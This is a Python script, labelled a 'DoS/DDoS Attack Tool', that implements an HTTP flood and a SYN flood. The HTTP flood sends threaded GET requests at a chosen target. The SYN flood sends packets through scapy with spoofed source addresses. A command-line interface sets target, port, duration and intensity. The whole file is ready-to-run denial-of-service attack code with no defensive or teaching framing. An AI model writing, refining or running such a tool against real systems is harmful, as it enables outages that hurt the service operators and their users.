import socket
import threading
import time
import argparse
from scapy.all import IP, TCP, send
import random

class HTTPFlood:
    def __init__(self, target, port, urls_file, duration, intensity):
        self.target = target
        self.port = port
        self.urls = self.read_urls(urls_file)
        self.duration = duration
        self.intensity = intensity

    def read_urls(self, filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"File {filename} not found.")
            return []

    def send_request(self, url):
        try:
            http_request = f"GET {url} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((self.target, self.port))
                s.send(http_request.encode())
            print(f"Request sent to {url}")
        except Exception as e:
            print(f"Error sending request: {e}")

    def start_attack(self):
        print("Starting HTTP flood attack...")
        threads = []
        start_time = time.time()
        while time.time() - start_time < self.duration:
            for _ in range(self.intensity):
                thread = threading.Thread(target=self.send_request, args=(self.urls[0],))
                thread.start()
                threads.append(thread)
            time.sleep(1)
        for thread in threads:
            thread.join()
        print("HTTP flood attack completed.")

class SynFlood:
    def __init__(self, target, port, duration, pps):
        self.target = target
        self.port = port
        self.duration = duration
        self.pps = pps

    def start_attack(self):
        print("Starting SYN flood attack...")
        start_time = time.time()
        while time.time() - start_time < self.duration:
            # Generate a random source IP
            src_ip = f"192.168.1.{random.randint(1, 255)}"
            packet = IP(src=src_ip, dst=self.target) / TCP(dport=self.port, flags="S")
            send(packet, verbose=0)
            time.sleep(1/self.pps)
            print(f"SYN packet sent from {src_ip} to {self.target}:{self.port}")
        print("SYN flood attack completed.")

def main():
    parser = argparse.ArgumentParser(description='DoS/DDoS Attack Tool')
    parser.add_argument('attack_type', choices=['http', 'syn'], help='Type of attack (http or syn)')
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, required=True, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('-i', '--intensity', type=int, default=100, help='Intensity of attack (requests/threads per second)')
    parser.add_argument('-u', '--urls', type=str, help='File containing URLs for HTTP flood')
    args = parser.parse_args()

    if args.attack_type == 'http':
        if not args.urls:
            print("For HTTP flood, please provide a URLs file.")
            return
        http_flood = HTTPFlood(args.target, args.port, args.urls, args.duration, args.intensity)
        http_flood.start_attack()
    elif args.attack_type == 'syn':
        syn_flood = SynFlood(args.target, args.port, args.duration, args.intensity)
        syn_flood.start_attack()

if __name__ == "__main__":
    main()